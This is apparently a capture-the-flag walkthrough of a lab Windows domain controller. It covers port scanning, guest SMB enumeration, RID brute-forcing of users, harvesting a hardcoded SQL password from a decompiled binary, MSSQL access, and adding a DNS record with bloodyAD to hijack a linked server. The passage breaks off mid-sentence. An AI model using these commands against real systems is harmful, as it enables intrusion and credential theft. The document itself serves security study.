# Host file setup

```python
sudo nxc smb 10.129.244.81 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT s200401.overwatch.htb                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 15:51 +0100
Nmap scan report for s200401.overwatch.htb (10.129.244.81)
Host is up (0.013s latency).
rDNS record for 10.129.244.81: S200401.overwatch.htb
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
59048/tcp open  unknown
59049/tcp open  unknown
59056/tcp open  unknown
59143/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.26 seconds
```

## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -A --min-rate=2000 -sT s200401.overwatch.htb                                                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 15:53 +0100
Nmap scan report for s200401.overwatch.htb (10.129.244.81)
Host is up (0.013s latency).
rDNS record for 10.129.244.81: S200401.overwatch.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  tcpwrapped
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 14:53:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-10T14:54:29+00:00
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2026-05-12T14:36:16
|_Not valid after:  2026-11-11T14:36:16
|_ssl-date: 2026-08-10T14:55:09+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-10T14:47:15
|_Not valid after:  2056-08-10T14:47:15
| ms-sql-info: 
|   10.129.244.81:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ms-sql-ntlm-info: 
|   10.129.244.81:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-08-10T14:55:09+00:00; -1s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth is enabled as with all domain controllers but not able to use it to access shares or list users

## Guest access
```python
nxc smb s200401.overwatch.htb -u 'Guest' -p ''             
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\Guest:
```

The guest account is enabled!

### Shares
```python
nxc smb s200401.overwatch.htb -u 'Guest' -p '' --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\Guest: 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share
```

### Users
```python
nxc smb s200401.overwatch.htb -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
S200401$
sqlsvc
sqlmgmt
SQL03$
NB001$
NB002$
FILE01$
S200400$
Charlie.Moss
Tracy.Burns
Kathryn.Bryan
Rachael.Thomas
Aimee.Smith
Duncan.Freeman
John.Begum
Bernard.Hilton
Kim.Hargreaves
Douglas.Burrows
Carole.Murray
Olivia.Quinn
Trevor.Baker
Kenneth.Dennis
Jeremy.Marshall
Jodie.Jones
Thomas.Lee
Terence.Matthews
Colin.Roberts
Aaron.Robinson
Amanda.Jenkins
Debra.Arnold
Michelle.Willis
Kayleigh.Jones
Adam.Russell
Tracey.Kelly
Bethan.Dale
Mandy.Wood
Jenna.Phillips
Carole.Yates
Graham.Perry
Catherine.Griffiths
Shaun.Jackson
Bethan.Rogers
Ellie.Singh
Marie.Allan
Patrick.Holmes
Victor.Hopkins
Geraldine.Harper
George.Todd
Karl.Smith
Jacqueline.Norton
Frederick.Murray
Joe.Pearce
Paul.Collins
Damien.Edwards
Eileen.Phillips
Carl.Johnson
Kevin.Newton
Natalie.Higgins
Francis.Weston
Benjamin.Davison
Martin.Kemp
Angela.Jones
Gareth.Ahmed
Deborah.Morgan
Grace.Taylor
Roger.Hughes
Albert.Barrett
Grace.Curtis
Marilyn.Griffiths
Tracey.Barker
Suzanne.Hughes
Timothy.Jackson
Beverley.Thompson
Clare.Bartlett
Irene.Johnson
Bernard.Wood
Frank.McCarthy
Elaine.Page
Elaine.Walker
Mohammad.Hill
Glenn.Field
Deborah.Martin
Gail.Sullivan
Maureen.Kirby
Georgina.Chambers
Philip.Harris
Samantha.Scott
Ann.Hill
Chloe.Cox
Jamie.Gough
Frederick.Hussain
Dean.Hobbs
Danielle.Moore
Timothy.Smith
Declan.Stone
Jacob.Wilson
Gary.Elliott
Peter.Slater
Louise.Walton
Brett.Haynes
Elliot.Green
Wendy.Williams
Graham.Parker
Abdul.Stevens
Brett.Bailey
Benjamin.Harrison
Emily.Cooper
Roger.Spencer
```

Ive used `--rid-brute` since it also pulls out machine accounts

# `software$` smb share

```python
smbclient //s200401.overwatch.htb/software$ -U 'Guest'%''             
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Sat May 17 02:27:07 2025
  ..                                DHS        0  Thu Jan  1 06:46:47 2026
  Monitoring                         DH        0  Sat May 17 02:32:43 2025

		7147007 blocks of size 4096. 1112608 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 02:32:43 2025
  ..                                 DH        0  Sat May 17 02:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 21:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 21:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 21:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 21:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 15:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 02:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 02:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 02:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 21:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 21:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 21:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 19:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 15:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 15:46:10 2017
  x64                                DH        0  Sat May 17 02:32:33 2025
  x86                                DH        0  Sat May 17 02:32:33 2025

		7147007 blocks of size 4096. 1118837 blocks available
smb: \Monitoring\>
```

Found some dlls and exe files, ill download all of this and take a look

![1307](Pasted%20image%2020260810161220.png)

Ive loaded the `overwatch.exe` file into ILspy and found credentials in the application

```python
("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");
```

# Compromising `sqlsvc`

```python
nxc smb s200401.overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share
```

This user has more access on the shares!

This user does not have access over WINRM or RDP

No kerberoastable accounts

No password reuse

No GPP passwords

No passwords in account descriptions!

There is no lockout policy so password spraying is not an issue

# Access on mssql as `sqlsvc`

```python
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@s200401 -p 6520 -windows-auth
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> 
```

I now have access to the mssql instance

```python
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on   
---------   -----------------   
master                      0   
tempdb                      0   
model                       0   
msdb                        1   
overwatch                   0   
SQL (OVERWATCH\sqlsvc  guest@master)>
```

Non default db called `overwatch`

```python
SQL (OVERWATCH\sqlsvc  guest@master)> enum_owner
Database    Owner              
---------   ----------------   
master      sa                 
tempdb      sa                 
model       sa                 
msdb        sa                 
overwatch   OVERWATCH\sqlsvc   
SQL (OVERWATCH\sqlsvc  guest@master)>
```

Looks like the current user is the owner of this db 

There is nothing in any of these databases

```python
SQL (OVERWATCH\sqlsvc  guest@master)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (OVERWATCH\sqlsvc  guest@master)>
```

However, there is a linked server `SQL07`

I cannot connect to it or execute commands on it

```python
nslookup SQL07.overwatch.htb S200401.overwatch.htb
Server:		S200401.overwatch.htb
Address:	10.129.244.81#53

** server can't find SQL07.overwatch.htb: NXDOMAIN
```

As seen here, it doesnt look to hold any records, maybe i can add one with my IP address

```python
bloodyAD --host s200401.overwatch.htb -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' add dnsRecord SQL07 10.10.14.61
[+] SQL07 has been successfully added
```

So first ill add the 

